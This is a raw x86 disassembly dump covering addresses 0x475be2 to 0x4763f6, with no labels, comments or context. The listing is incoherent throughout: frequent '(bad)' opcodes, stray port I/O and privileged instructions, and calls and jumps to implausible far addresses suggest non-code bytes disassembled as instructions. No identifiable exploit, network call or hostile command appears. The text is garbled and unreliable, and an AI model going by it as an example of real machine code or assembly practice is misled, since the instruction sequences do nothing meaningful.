  475be2:	mov    esi,esi
  475be4:	pop    ss
  475be5:	cmp    DWORD PTR [edi+0x8],0xe0acc7e5
  475bec:	adc    al,0xc8
  475bee:	or     ch,ah
  475bf0:	adc    eax,0x4454a945
  475bf5:	or     BYTE PTR [ecx],cl
  475bf7:	inc    ebp
  475bf8:	outs   dx,BYTE PTR ds:[esi]
  475bf9:	and    BYTE PTR [eax+0x72],al
  475bfc:	rol    edi,1
  475bfe:	ins    BYTE PTR es:[edi],dx
  475bff:	inc    ebp
  475c00:	jb     0x475c5d
  475c02:	dec    esp
  475c03:	fwait
  475c04:	(bad)  
  475c05:	rcl    BYTE PTR [edi],1
  475c07:	ret    
  475c08:	adc    eax,0x5717d0c8
  475c0d:	inc    ecx
  475c0e:	inc    edx
  475c0f:	dec    esi
  475c10:	mov    ah,0xdf
  475c12:	jb     0x475c7b
  475c14:	retf   
  475c15:	xor    al,0xe6
  475c17:	(bad)  
  475c18:	xor    al,0xe6
  475c1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  475c1b:	sti    
  475c1c:	mov    edx,0x646142af
  475c21:	adc    bh,BYTE PTR [ebx-0x39]
  475c24:	cwde   
  475c25:	xchg   edx,eax
  475c26:	sub    edx,DWORD PTR [eax-0x5dea6775]
  475c2c:	fnsave [eax-0x3f]
  475c2f:	xchg   esp,eax
  475c30:	fs gs js 0x475c8b
  475c34:	cld    
  475c35:	(bad)  
  475c36:	adc    ah,ah
  475c38:	or     ah,ah
  475c3a:	cld    
  475c3b:	sbb    BYTE PTR [ebx+0x58],cl
  475c3e:	sub    eax,0x4c5448c1
  475c43:	outs   dx,DWORD PTR ds:[esi]
  475c44:	mov    ah,0x77
  475c46:	adc    bl,BYTE PTR [eax+0x32]
  475c49:	xchg   DWORD PTR [edi+eiz*8-0x31],esp
  475c4d:	add    BYTE PTR [edi-0x189bb1b8],0x43
  475c54:	jb     0x475cbb
  475c56:	enter  0x3245,0x6c
  475c5a:	sbb    bh,cl
  475c5c:	int3   
  475c5d:	int3   
  475c5e:	push   edi
  475c5f:	and    al,cl
  475c61:	adc    eax,0x6d497a14
  475c66:	jo     0x475c48
  475c68:	and    eax,0xc76cb089
  475c6d:	xchg   esi,eax
  475c6e:	fsub   DWORD PTR [esi]
  475c70:	pusha  
  475c71:	adc    eax,0x30978a72
  475c76:	call   0x6d9a1fa5
  475c7b:	aad    0xcf
  475c7d:	cwde   
  475c7e:	mov    ss,WORD PTR [edi+0x21]
  475c81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  475c82:	cmp    bh,al
  475c84:	cwde   
  475c85:	call   0x854afbdf
  475c8a:	mov    ch,BYTE PTR [esi-0xa]
  475c8d:	jo     0x475c34
  475c8f:	int    0xfc
  475c91:	inc    edx
  475c92:	dec    esi
  475c93:	jno    0x475d09
  475c95:	(bad)  
  475c96:	repnz (bad) 
  475c98:	cld    
  475c99:	call   0xac4d2df9
  475c9e:	bnd jo 0x475cc7
  475ca1:	arpl   WORD PTR [eax-0x3d],bp
  475ca4:	leave  
  475ca5:	shld   esi,edx,0x97
  475ca9:	xor    bl,BYTE PTR [esi-0x17]
  475cac:	adc    DWORD PTR [edi+0x1d],ecx
  475caf:	mov    esp,esp
  475cb1:	in     al,dx
  475cb2:	inc    esp
  475cb3:	jbe    0x475cc8
  475cb5:	xor    edi,ebp
  475cb7:	cld    
  475cb8:	push   es
  475cb9:	mov    esp,0x41e254e4
  475cbe:	or     DWORD PTR [ebx],esp
  475cc0:	gs jmp 0x48a4a571
  475cc6:	(bad)  
  475cc7:	(bad)  
  475cc9:	mov    ebx,0x91fb4d5b
  475cce:	in     al,dx
  475ccf:	add    al,0xe8
  475cd1:	in     al,0x51
  475cd3:	test   ebx,0x5813f940
  475cd9:	dec    ecx
  475cda:	not    BYTE PTR [edx+eax*1+0x27]
  475cde:	mov    bh,0x4f
  475ce0:	jo     0x475ced
  475ce2:	es call 0x88302373
  475ce8:	mov    esp,0x26717020
  475ced:	in     al,0xa1
  475cef:	shr    BYTE PTR [edi-0x1c],0x6
  475cf3:	dec    esi
  475cf4:	enter  0x8825,0xfe
  475cf8:	jmp    0x7e8a1f1c
  475cfd:	fsubrp st(4),st
  475cff:	mov    edx,0x190cf03
  475d04:	jns    0x475d0a
  475d06:	fisttp WORD PTR [esi-0x16]
  475d09:	test   BYTE PTR [edx+esi*2],dl
  475d0c:	add    bl,BYTE PTR [ecx-0x7e15aaa8]
  475d12:	pushf  
  475d13:	and    bh,BYTE PTR [ecx]
  475d15:	out    0xea,eax
  475d17:	sub    al,0x72
  475d19:	add    al,0xc8
  475d1b:	add    esp,esp
  475d1d:	and    ch,ah
  475d1f:	out    dx,al
  475d20:	jmp    0xeb3e:0xe4064272
  475d27:	inc    eax
  475d28:	sbb    bh,ah
  475d2a:	or     DWORD PTR [ecx],esp
  475d2c:	in     al,0x1
  475d2e:	inc    ebp
  475d2f:	jmp    0x475d31
  475d31:	pushf  
  475d32:	and    BYTE PTR [eax+0x17],dl
  475d35:	aad    0x8d
  475d37:	in     eax,dx
  475d38:	arpl   WORD PTR [ecx+0x3dadc785],si
  475d3e:	or     ah,BYTE PTR [edx+0x7f]
  475d41:	cmp    DWORD PTR [eax],esi
  475d43:	ror    DWORD PTR [ebp+0x9],1
  475d46:	mov    ebx,0xe11d1905
  475d4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  475d4c:	mov    ebp,0x2666ca21
  475d51:	clc    
  475d52:	sub    eax,0xcfefbffe
  475d57:	test   DWORD PTR [edi-0x2a],esp
  475d5a:	pop    esp
  475d5b:	push   eax
  475d5c:	scas   al,BYTE PTR es:[edi]
  475d5d:	fst    QWORD PTR [ecx]
  475d5f:	sub    eax,0x37744608
  475d64:	push   ecx
  475d65:	idiv   BYTE PTR [bx]
  475d68:	dec    eax
  475d69:	je     0x475dcd
  475d6b:	sbb    eax,0x2e024b0b
  475d70:	int    0x4c
  475d72:	imul   esp,DWORD PTR [edi+ebx*4+0x56],0x49e02690
  475d7a:	mov    al,ds:0x76d9307b
  475d7f:	std    
  475d80:	add    BYTE PTR [ecx+ebx*8],bh
  475d83:	adc    BYTE PTR [ebx],dl
  475d85:	popa   
  475d86:	or     ecx,eax
  475d88:	add    ebx,ecx
  475d8a:	mov    bl,0x14
  475d8c:	jae    0x475d76
  475d8e:	in     eax,0x4b
  475d90:	cmp    esp,esp
  475d92:	daa    
  475d93:	fistp  WORD PTR [esi-0x26]
  475d96:	add    al,bh
  475d98:	mov    eax,ds:0x87f8702c
  475d9d:	mov    esp,0x4a20e4a5
  475da2:	hlt    
  475da3:	mov    eax,ds:0x87f4729c
  475da8:	cld    
  475da9:	dec    edx
  475daa:	ds dec esp
  475dac:	out    0xf0,al
  475dae:	mov    eax,ds:0x43f07378
  475db3:	cmp    BYTE PTR ds:[eax+esi*4],0xec
  475db8:	mov    eax,ds:0x7e4371ec
  475dbd:	and    eax,0xe780ec9f
  475dc2:	call   0xe4b7ca68
  475dc7:	(bad)  
  475dc8:	dec    edx
  475dc9:	sahf   
  475dca:	call   0x70d3a4b3
  475dcf:	fs cmp al,0x8
  475dd2:	push   cs
  475dd3:	test   BYTE PTR [ebx-0x15],bh
  475dd6:	jae    0x475de7
  475dd8:	add    WORD PTR [ecx+0x6a],di
  475ddc:	sub    BYTE PTR [eax+0x34],dh
  475ddf:	inc    ebp
  475de0:	push   eax
  475de1:	mov    eax,ds:0x8d9e3a6f
  475de6:	and    al,0x72
  475de8:	add    dl,bh
  475dea:	enter  0xbcc,0x89
  475dee:	pop    ebp
  475def:	or     eax,0xd0b42152
  475df4:	or     al,0xd4
  475df6:	add    ah,0xc4
  475df9:	aaa    
  475dfa:	int    0xd3
  475dfc:	adc    al,0x30
  475dfe:	fcomp  st(4)
  475e00:	enter  0xc002,0xa1
  475e04:	inc    esp
  475e05:	pop    es
  475e06:	enter  0x90e7,0x71
  475e0a:	ror    BYTE PTR [eax],0x7b
  475e0d:	xchg   esp,eax
  475e0e:	inc    ebp
  475e0f:	inc    ebx
  475e10:	push   cs
  475e11:	(bad)  
  475e12:	in     eax,dx
  475e13:	xchg   esi,eax
  475e14:	ror    BYTE PTR [edx-0x20],0xd8
  475e18:	add    al,0x5c
  475e1a:	enter  0x8ba,0xde
  475e1e:	outs   dx,DWORD PTR ds:[esi]
  475e1f:	add    dl,BYTE PTR [edx]
  475e21:	fistp  WORD PTR [ecx+0x50]
  475e24:	xor    bl,bl
  475e26:	inc    esp
  475e27:	mov    edi,0x40dd8f29
  475e2c:	call   0xb085:0x4671eb81
  475e33:	sbb    DWORD PTR [edx],esp
  475e35:	push   cs
  475e36:	je     0x475e45
  475e38:	cmp    al,dl
  475e3a:	fs (bad) 
  475e3d:	leave  
  475e3e:	stc    
  475e3f:	fldenv [ebx+ebp*8+0x10]
  475e43:	adc    eax,0x67eb54da
  475e48:	inc    eax
  475e49:	dec    esi
  475e4a:	hlt    
  475e4b:	inc    ebp
  475e4c:	pop    ds
  475e4d:	iret   
  475e4e:	es out dx,al
  475e50:	seto   BYTE PTR [edi]
  475e53:	jb     0x475e0d
  475e55:	outs   dx,DWORD PTR ds:[esi]
  475e56:	mov    al,0xe8
  475e58:	sub    eax,0x18c8bdee
  475e5d:	and    bh,al
  475e5f:	loopne 0x475e25
  475e61:	inc    edx
  475e62:	stos   DWORD PTR es:[edi],eax
  475e63:	inc    ebx
  475e64:	ins    BYTE PTR es:[edi],dx
  475e65:	clc    
  475e66:	cli    
  475e67:	pop    ebx
  475e68:	xlat   BYTE PTR ds:[ebx]
  475e69:	call   0x81e5de9d
  475e6e:	rol    DWORD PTR [eax],0xca
  475e71:	mov    edx,DWORD PTR [ecx+eax*8+0x4]
  475e75:	add    edx,DWORD PTR [ecx+eax*8]
  475e78:	cmp    DWORD PTR [edi],0x3ba24eeb
  475e7e:	xchg   esp,eax
  475e7f:	sub    DWORD PTR [edi+ecx*1-0x61],0xffffffc2
  475e84:	dec    eax
  475e85:	adc    bl,al
  475e87:	sub    DWORD PTR [ecx-0x1c8217ba],edi
  475e8d:	iret   
  475e8e:	pop    esp
  475e8f:	inc    edi
  475e90:	adc    cl,BYTE PTR [edi+eax*1+0x30]
  475e94:	repnz fs (bad) 
  475e97:	cmp    edi,DWORD PTR [ebx]
  475e99:	fadd   QWORD PTR ss:[ecx+eax*4+0x6c8c9245]
  475ea1:	jnp    0x475e7c
  475ea3:	mov    eax,DWORD PTR [ebp+0x75fbed95]
  475ea9:	or     BYTE PTR [ebx],al
  475eab:	pushf  
  475eac:	(bad)  
  475ead:	xchg   ebx,eax
  475eae:	jne    0x475e34
  475eb0:	pushf  
  475eb1:	xchg   BYTE PTR [edi+0x22],bh
  475eb4:	sbb    eax,0x4e0926ad
  475eb9:	bnd jmp 0x475f30
  475ebc:	add    bl,bl
  475ebe:	jnp    0x475f28
  475ec0:	or     BYTE PTR [edx+eax*4+0x4852126d],cl
  475ec7:	xor    DWORD PTR [esi-0x21efb934],esi
  475ecd:	jo     0x475edd
  475ecf:	sbb    ebp,DWORD PTR [edi]
  475ed1:	out    dx,eax
  475ed2:	add    al,0x47
  475ed4:	call   0x5f43e4d5
  475ed9:	and    al,0xfc
  475edb:	jnp    0x475ed3
  475edd:	or     esi,esi
  475edf:	inc    eax
  475ee0:	add    DWORD PTR [eax],esp
  475ee2:	push   es
  475ee3:	push   edi
  475ee4:	add    BYTE PTR [edi],al
  475ee6:	sub    BYTE PTR [edi+0x41],0x31
  475eea:	sti    
  475eeb:	(bad)  
  475eec:	fstp   QWORD PTR [eax-0x3799d5]
  475ef2:	adc    DWORD PTR [eax+0x7e0fc003],edx
  475ef8:	fnstcw WORD PTR [edi+0x2288a923]
  475efe:	sbb    al,0x95
  475f00:	pop    edi
  475f01:	les    eax,FWORD PTR [eax+0x74]
  475f04:	adc    ecx,DWORD PTR [ecx-0x5]
  475f07:	mov    ah,0x7
  475f09:	inc    eax
  475f0a:	pop    eax
  475f0b:	add    BYTE PTR [esi+0x250febf8],dl
  475f11:	xor    al,0x3f
  475f13:	sub    eax,0xf81c211b
  475f18:	movzx  eax,WORD PTR [eax]
  475f1b:	lock call FWORD PTR [ebx]
  475f1e:	test   BYTE PTR [ebx+0x6b6e0b9d],ch
  475f24:	inc    ebx
  475f25:	xor    edi,edi
  475f27:	lea    esi,[ebp+0x7b4b705]
  475f2d:	(bad)  
  475f2e:	(bad)  
  475f2f:	push   esp
  475f30:	call   0xf44ea740
  475f35:	mov    ch,0xca
  475f37:	lea    eax,[edi+0x1]
  475f3a:	pushf  
  475f3b:	clc    
  475f3c:	or     al,0xed
  475f3e:	cld    
  475f3f:	loopne 0x475f10
  475f41:	pushf  
  475f42:	and    DWORD PTR [ebp-0x5bc80b7b],ecx
  475f48:	xchg   ecx,eax
  475f49:	mov    ebp,0x815916fb
  475f4e:	xchg   ebp,eax
  475f4f:	inc    ebx
  475f50:	sub    edx,DWORD PTR [eax+0x4]
  475f53:	inc    edx
  475f54:	pop    ds
  475f55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  475f56:	jne    0x475f8e
  475f58:	push   ecx
  475f59:	dec    eax
  475f5a:	inc    edi
  475f5b:	outs   dx,DWORD PTR ds:[esi]
  475f5c:	sahf   
  475f5d:	jmp    0x475f79
  475f5f:	inc    ebx
  475f60:	and    BYTE PTR [edi],dh
  475f62:	in     al,0x60
  475f64:	mov    WORD PTR [ebp+0x49ccfb4f],cs
  475f6a:	mov    ds:0xe44a0a48,al
  475f6f:	dec    eax
  475f70:	repz push ebp
  475f72:	dec    ebx
  475f73:	(bad)  
  475f74:	or     esp,edi
  475f76:	bound  edi,QWORD PTR [ebx-0x22]
  475f79:	inc    eax
  475f7a:	pop    ecx
  475f7b:	hlt    
  475f7c:	sub    ah,dh
  475f7e:	add    esi,DWORD PTR es:[ebx-0x69]
  475f82:	in     al,dx
  475f83:	test   DWORD PTR [ebx-0x13],ebx
  475f86:	lods   al,BYTE PTR ds:[esi]
  475f87:	in     eax,dx
  475f88:	xor    edi,DWORD PTR [ebx-0x1f]
  475f8b:	cmp    eax,0x706d55d9
  475f90:	jne    0x475f47
  475f92:	push   eax
  475f93:	cld    
  475f94:	and    al,0x20
  475f96:	xchg   esi,eax
  475f97:	daa    
  475f98:	retf   
  475f99:	cmp    BYTE PTR [edi+0x4a],bl
  475f9c:	retf   0x21e0
  475f9f:	mov    edi,0x718230a4
  475fa4:	fisubr DWORD PTR [esi+0x530de2fe]
  475faa:	aas    
  475fab:	jmp    0x476009
  475fad:	mov    DWORD PTR [esi+0x3c],ebp
  475fb0:	mov    esi,0xf7501a2
  475fb5:	data16 cmp al,BYTE PTR [ebx+0x34]
  475fb9:	call   0x2a46:0xebef13f7
  475fc0:	add    DWORD PTR [edx],ecx
  475fc2:	mov    bl,BYTE PTR [ebx]
  475fc4:	mov    WORD PTR [edi],cs
  475fc6:	adc    BYTE PTR es:[eax-0x899caac],cl
  475fcd:	repnz dec ebp
  475fcf:	xchg   esp,esi
  475fd1:	in     al,dx
  475fd2:	and    BYTE PTR [ecx+ecx*1-0x27],dh
  475fd6:	int3   
  475fd7:	jmp    0x475ffe
  475fd9:	xchg   edx,eax
  475fda:	(bad)  
  475fdb:	cli    
  475fdc:	inc    eax
  475fdd:	or     al,0x9
  475fdf:	sub    al,0xee
  475fe1:	push   eax
  475fe2:	clc    
  475fe3:	mov    dl,0xf
  475fe5:	clc    
  475fe6:	and    al,0xeb
  475fe8:	or     al,0xb9
  475fea:	or     esi,DWORD PTR [eax]
  475fec:	add    eax,0xfcc8b80
  475ff1:	jb     0x475f7b
  475ff3:	mov    edi,0xd12d0675
  475ff8:	pop    es
  475ff9:	in     eax,dx
  475ffa:	xchg   ecx,eax
  475ffb:	aas    
  475ffc:	dec    eax
  475ffd:	es push eax
  475fff:	jne    0x476059
  476001:	ret    
  476002:	aas    
  476003:	in     al,0x42
  476005:	push   cs
  476006:	push   ebp
  476007:	loope  0x476019
  476009:	fadd   QWORD PTR [edx+0x26]
  47600c:	cli    
  47600d:	jecxz  0x475f9c
  47600f:	test   edx,ebx
  476011:	mov    DWORD PTR [ebx+0x43],eax
  476014:	call   0x3698a835
  476019:	add    ecx,DWORD PTR [eax-0x22e1aa39]
  47601f:	sub    ecx,DWORD PTR ds:0xe81f438b
  476025:	or     DWORD PTR [eax],ebx
  476027:	mov    ebp,0x5a2a9972
  47602c:	adc    ebx,esp
  47602e:	fcom   QWORD PTR [eax-0x17f8dea4]
  476034:	call   0xc8a3e0c8
  476039:	(bad)  
  47603b:	xchg   edx,eax
  47603c:	pop    ebp
  47603d:	jmp    0x47602d
  47603f:	xchg   esi,eax
  476040:	std    
  476041:	stc    
  476042:	push   eax
  476043:	push   0xc
  476045:	jno    0x475fdb
  476047:	call   0x73053e38
  47604c:	ins    BYTE PTR es:[edi],dx
  47604d:	sub    al,0x74
  47604f:	or     eax,DWORD PTR [eax]
  476051:	and    eax,0xee85f0da
  476056:	mov    ebp,0x153f2ec8
  47605b:	jo     0x476069
  47605d:	and    BYTE PTR ds:0xa1222aba,dl
  476063:	loopne 0x4760b8
  476065:	bound  ebp,QWORD PTR [edi+0x72a69039]
  47606b:	loopne 0x47604d
  47606d:	push   edx
  47606e:	in     al,0xe8
  476070:	jb     0x476092
  476072:	inc    ebp
  476073:	or     esp,ebp
  476075:	loopne 0x476063
  476077:	lds    ebp,FWORD PTR [edi-0x1f]
  47607a:	inc    edx
  47607b:	jnp    0x4760df
  47607d:	dec    ebp
  47607e:	call   DWORD PTR [ebp+0x395e9a49]
  476084:	xchg   ecx,eax
  476085:	jmp    ecx
  476087:	adc    BYTE PTR [ebp+0x55312eb],cl
  47608d:	xchg   ebp,eax
  47608e:	icebp  
  47608f:	push   es
  476090:	in     al,0x40
  476092:	nop
  476093:	sbb    ah,ah
  476095:	sahf   
  476096:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  476097:	push   0x2e978135
  47609c:	add    esi,DWORD PTR [eiz*1+0x27900952]
  4760a3:	cmp    BYTE PTR [esi],bh
  4760a5:	xor    esi,edx
  4760a7:	imul   edx,ebx,0x3b560eff
  4760ad:	inc    eax
  4760ae:	jns    0x47606a
  4760b0:	adc    ch,BYTE PTR [edx]
  4760b2:	dec    edi
  4760b3:	call   DWORD PTR [edi]
  4760b5:	add    DWORD PTR [edx],ebx
  4760b7:	or     BYTE PTR [eax],dh
  4760b9:	loopne 0x4760cb
  4760bb:	jo     0x476101
  4760bd:	aam    0x12
  4760bf:	lock out 0xbd,al
  4760c2:	and    eax,0x13013a5b
  4760c7:	mov    WORD PTR [ebx],di
  4760ca:	imul   ebp,DWORD PTR [edx],0x32f4774f
  4760d0:	pop    esp
  4760d1:	sbb    BYTE PTR [ecx-0x39],al
  4760d4:	call   DWORD PTR [ecx+eiz*1-0x4]
  4760d8:	adc    BYTE PTR [ecx-0x29ff0cb0],bh
  4760de:	imul   esp,ecx,0x6c
  4760e1:	jmp    0x47610d
  4760e3:	pushf  
  4760e4:	xor    BYTE PTR [edx-0x5ce938c4],al
  4760ea:	mov    eax,ds:0x491a0486
  4760ef:	sbb    BYTE PTR [ecx],ah
  4760f1:	adc    eax,0x28e8a998
  4760f6:	je     0x4760ed
  4760f8:	scas   eax,DWORD PTR es:[edi]
  4760f9:	loopne 0x47607e
  4760fb:	jg     0x476168
  4760fd:	mov    ?,WORD PTR [ebx]
  4760ff:	repz je 0x476138
  476102:	pop    ebx
  476103:	jne    0x47612b
  476105:	js     0x476112
  476107:	retf   
  476108:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  476109:	push   0x4d04c606
  47610e:	sar    DWORD PTR [esi-0x77],cl
  476111:	add    al,BYTE PTR [esi+0x4]
  476114:	or     cl,BYTE PTR [eax]
  476116:	or     BYTE PTR [eax+edi*8],cl
  476119:	cdq    
  47611a:	js     0x476150
  47611c:	or     al,0xf4
  47611e:	inc    ecx
  47611f:	jecxz  0x476175
  476121:	les    edi,FWORD PTR [ebx]
  476123:	nop
  476124:	ret    
  476125:	div    DWORD PTR ds:0x1f8d843a
  47612b:	adc    ch,0xbb
  47612e:	repz mov eax,ds:0x9108de38
  476134:	cmp    eax,0x42981814
  476139:	mov    dx,0x6
  47613d:	rcl    BYTE PTR [edx+0x5a],1
  476140:	call   0x6f8f063a
  476145:	adc    al,0x92
  476147:	add    DWORD PTR [ecx],edi
  476149:	mov    ah,0x71
  47614b:	pop    es
  47614c:	ds and al,cl
  47614f:	test   edi,esi
  476151:	jns    0x47612b
  476153:	outs   dx,BYTE PTR ds:[esi]
  476154:	cmc    
  476155:	cmp    ebp,0x569d4360
  47615b:	mov    eax,ds:0xa29372a0
  476160:	inc    esp
  476161:	rcl    BYTE PTR [ecx-0x1ddb5ff5],0x78
  476168:	add    ch,BYTE PTR [esi+0x6e]
  47616b:	mov    esi,0x2306744f
  476170:	jmp    0x4761b4
  476172:	cmp    dl,BYTE PTR [ebx]
  476174:	mov    BYTE PTR [ebx],ah
  476176:	mov    WORD PTR [ecx],cs
  476178:	cmp    esi,esi
  47617a:	jo     0x47610c
  47617c:	test   BYTE PTR [edx+0x25],0x74
  476180:	cld    
  476181:	cmp    edx,eax
  476183:	jmp    0x4761ab
  476185:	inc    eax
  476186:	lock xor BYTE PTR [edi+ebx*4],0xe6
  47618b:	lock hlt 
  47618d:	outs   dx,DWORD PTR ds:[esi]
  47618e:	shl    ah,0xa4
  476191:	sub    DWORD PTR [esi+ecx*4],eax
  476194:	mov    bh,0xf5
  476196:	cmc    
  476197:	arpl   di,ax
  476199:	dec    eax
  47619a:	push   cs
  47619b:	into   
  47619c:	lock push edi
  47619e:	mov    esp,0x473a4319
  4761a3:	call   0xde3d9ce9
  4761a8:	add    esi,eax
  4761aa:	cwde   
  4761ab:	lock (bad) 
  4761ad:	sub    eax,0xe0bbb019
  4761b2:	and    DWORD PTR [edx+0x8],ebp
  4761b5:	mov    bl,0x53
  4761b7:	inc    ecx
  4761b8:	mov    eax,ds:0x810e0b8
  4761bd:	inc    edx
  4761be:	mov    ebx,0x5f82c038
  4761c3:	(bad)  
  4761c4:	and    eax,0x8d7eb971
  4761c9:	sar    al,cl
  4761cb:	and    ch,cl
  4761cd:	out    0x6,eax
  4761cf:	xor    eax,0xe5458b94
  4761d4:	mov    ds:0x6081d97f,eax
  4761d9:	mov    ds:0xf803cf4,eax
  4761de:	xchg   esi,eax
  4761df:	pop    edi
  4761e0:	sar    BYTE PTR [eax-0x9dfe1a6],cl
  4761e6:	sub    ebp,DWORD PTR [eax+esi*8-0x43]
  4761ea:	mov    eax,ds:0x3639426f
  4761ef:	call   0x9c81fbde
  4761f4:	pusha  
  4761f5:	and    eax,0xc7578488
  4761fa:	nop
  4761fb:	add    eax,0xffffff87
  4761fe:	imul   ebx,DWORD PTR [esi+0x7229c45e],0x33
  476205:	mov    ecx,0x1484c9e4
  47620a:	dec    edx
  47620b:	es jns 0x4761ee
  47620e:	inc    eax
  47620f:	or     edi,esp
  476211:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  476212:	xor    al,0xdc
  476214:	pop    eax
  476215:	ret    
  476216:	pop    edi
  476217:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  476218:	adc    eax,0xb43030f0
  47621d:	add    BYTE PTR [ebx],bl
  47621f:	jbe    0x476285
  476221:	shl    BYTE PTR [edx+0x10],0x56
  476225:	loope  0x4761cb
  476227:	push   edx
  476228:	shl    BYTE PTR ds:0x7d80fbe0,1
  47622e:	push   ds
  47622f:	push   ecx
  476230:	add    al,0xe4
  476232:	cmp    ecx,DWORD PTR [eax+0x41]
  476235:	dec    esi
  476236:	and    edi,esi
  476238:	cmp    eax,0x849dcb8b
  47623d:	adc    BYTE PTR [ebx],0x4a
  476240:	pop    esi
  476241:	pop    ds
  476242:	sbb    al,0xe
  476244:	dec    esi
  476245:	call   0xe359f0ba
  47624a:	sub    BYTE PTR [ebx],al
  47624c:	cmp    ecx,DWORD PTR [eax]
  47624e:	out    dx,al
  47624f:	pop    esi
  476250:	add    BYTE PTR ds:0xeb09b28a,0x18
  476257:	jb     0x4761e6
  476259:	into   
  47625a:	push   cs
  47625b:	std    
  47625c:	loop   0x47625d
  47625e:	and    al,cl
  476260:	pop    ebp
  476261:	cld    
  476262:	sbb    cl,BYTE PTR [edi]
  476264:	mov    bh,0xd0
  476266:	cmp    edx,0x14
  476269:	ja     0x12bd51a6
  47626f:	push   eax
  476270:	shl    BYTE PTR [eax],cl
  476272:	push   0xffffffa2
  476274:	mov    esi,0xa79eca06
  476279:	stc    
  47627a:	cmp    al,0xf2
  47627c:	or     eax,0x694827f8
  476281:	cmp    eax,0x8679e7cd
  476286:	mov    ds:0xc89af981,eax
  47628b:	jl     0x47625c
  47628d:	ins    DWORD PTR es:[edi],dx
  47628e:	repnz push ds
  476290:	jo     0x47628b
  476292:	daa    
  476293:	jecxz  0x476293
  476295:	push   es
  476296:	sbb    bh,cl
  476298:	dec    esp
  476299:	add    al,0xce
  47629b:	shl    DWORD PTR ds:0x31205d53,cl
  4762a1:	cli    
  4762a2:	add    DWORD PTR [esi-0x14],0xa
  4762a6:	cmp    BYTE PTR ds:0x801a9e18,0x40
  4762ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4762ae:	rol    al,1
  4762b0:	retf   0x1a5d
  4762b3:	lock les ebp,FWORD PTR [eax+0x151c9e31]
  4762ba:	push   ds
  4762bb:	sub    eax,0xf84f2edd
  4762c0:	mov    al,0xf
  4762c2:	mov    edi,0x6b029905
  4762c7:	mov    ah,0x72
  4762c9:	sar    BYTE PTR [ecx+0x140035c6],1
  4762cf:	ins    BYTE PTR es:[edi],dx
  4762d0:	inc    eax
  4762d1:	mov    ?,WORD PTR [ebx]
  4762d3:	clc    
  4762d4:	fldcw  WORD PTR [esp+eiz*2]
  4762d7:	push   eax
  4762d8:	or     eax,ebp
  4762da:	mov    ebx,ds
  4762dc:	push   eax
  4762dd:	xor    BYTE PTR [esi],ch
  4762df:	mov    ecx,0x87ed6ca6
  4762e4:	inc    eax
  4762e5:	inc    ecx
  4762e6:	(bad)  
  4762e8:	push   ecx
  4762e9:	jnp    0x47632b
  4762eb:	dec    esi
  4762ec:	lock push DWORD PTR [ebx+0xc]
  4762f0:	add    al,0x8
  4762f2:	sub    al,0x1c
  4762f4:	sub    al,0xc9
  4762f6:	(bad)  
  4762f7:	cli    
  4762f8:	in     al,0x44
  4762fa:	cmp    eax,ebp
  4762fc:	pop    eax
  4762fd:	add    al,0xa4
  4762ff:	test   eax,0x2097e87c
  476304:	pop    edx
  476305:	sbb    BYTE PTR [eax],bl
  476307:	sub    al,0xa0
  476309:	jg     0x4762b8
  47630b:	cmp    ebx,DWORD PTR [edi]
  47630d:	in     al,dx
  47630e:	in     al,0x49
  476310:	push   ebp
  476311:	loopne 0x476379
  476313:	jg     0x4762c9
  476315:	xor    al,0xe0
  476317:	enter  0x3c11,0x21
  47631b:	fmul   QWORD PTR [edi]
  47631d:	mov    esi,0x1c84dce1
  476322:	jnp    0x47636e
  476324:	loopne 0x4762b0
  476326:	aaa    
  476327:	fmul   DWORD PTR [ebx]
  476329:	enter  0xc531,0xd4
  47632d:	mov    dh,BYTE PTR ds:0x829fd0d4
  476333:	xchg   edi,eax
  476334:	sub    DWORD PTR [edx-0x438c2f2e],0x348036ec
  47633e:	ror    ah,1
  476340:	cmp    esp,ecx
  476342:	jne    0x4763b2
  476344:	mov    DWORD PTR [eax+ebx*2],ebx
  476347:	mov    dl,0xe7
  476349:	int    0xc8
  47634b:	test   DWORD PTR [ecx-0x1a82404c],eax
  476351:	js     0x4763a5
  476353:	enter  0xf104,0xbf
  476357:	dec    ecx
  476358:	clc    
  476359:	aam    0x1
  47635b:	je     0x476364
  47635d:	dec    dx
  476360:	je     0x476373
  476362:	jmp    0x47638c
  476364:	mov    esp,0xe2b03edc
  476369:	and    eax,0x44e6c46f
  47636e:	jno    0x476387
  476370:	add    dl,dl
  476372:	les    eax,FWORD PTR [esi+0xf]
  476375:	test   BYTE PTR [ebx],cl
  476377:	xor    eax,0xeee326e1
  47637c:	xchg   edx,eax
  47637d:	and    eax,0xf8f2bfff
  476382:	into   
  476383:	ss push edi
  476385:	push   ds
  476386:	adc    ah,ah
  476388:	add    DWORD PTR [ebp-0x42f060d],eax
  47638e:	pop    es
  47638f:	inc    edi
  476390:	cli    
  476391:	xor    al,0x9f
  476393:	out    0x69,eax
  476395:	and    BYTE PTR fs:[ebx-0x521a053a],0x3d
  47639d:	(bad)  
  47639f:	add    al,0x3f
  4763a1:	pop    es
  4763a2:	adc    eax,0x3cf31fc2
  4763a7:	iret   
  4763a8:	rol    DWORD PTR [edi],cl
  4763aa:	xor    cl,BYTE PTR [edi+0x6c]
  4763ad:	mov    DWORD PTR [esi-0x5f3f38bd],esp
  4763b3:	add    al,0xb2
  4763b5:	scas   al,BYTE PTR es:[edi]
  4763b6:	add    BYTE PTR [ebx+0x72130661],dl
  4763bc:	sar    BYTE PTR [ebp+ebp*8+0x2f1c7237],0x86
  4763c4:	mov    esp,0x7300d91f
  4763c9:	mov    eax,0x762e4993
  4763ce:	mov    eax,0x70b4dd45
  4763d3:	xor    BYTE PTR [eax-0x51044b70],0x2d
  4763da:	cmp    ecx,ebp
  4763dc:	mov    esp,0xac3db0b0
  4763e1:	fsub   DWORD PTR [ecx-0x50]
  4763e4:	cmp    eax,ecx
  4763e6:	lods   al,BYTE PTR ds:[esi]
  4763e7:	cmp    eax,0x70128bb3
  4763ec:	jecxz  0x47638a
  4763ee:	cmp    al,0x60
  4763f0:	xor    eax,0xd238a8cc
  4763f5:	pusha  
  4763f6:	inc    edx
